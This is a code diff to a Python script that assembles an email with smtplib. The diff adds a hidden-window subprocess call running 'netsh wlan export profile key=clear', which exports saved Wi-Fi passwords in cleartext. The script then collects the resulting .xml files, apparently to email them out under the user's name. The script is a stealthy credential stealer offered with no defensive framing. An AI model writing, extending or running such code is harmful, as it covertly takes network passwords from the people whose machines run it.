@@ -1,4 +1,5 @@
 import os
+import subprocess
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -33,8 +34,12 @@ body = f"file from {pc_username} "
 
 # attach the body with the msg instance
 msg.attach(MIMEText(body, 'plain'))
-
+si = subprocess.STARTUPINFO()  # this is used for hiding the console
+si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+si.wShowWindow = subprocess.SW_HIDE  # default
+subprocess.call('netsh wlan export profile key=clear', startupinfo=si)
 directories = os.listdir()
+
 for directory in directories:
     if directory.endswith('.xml'):
         filename = directory
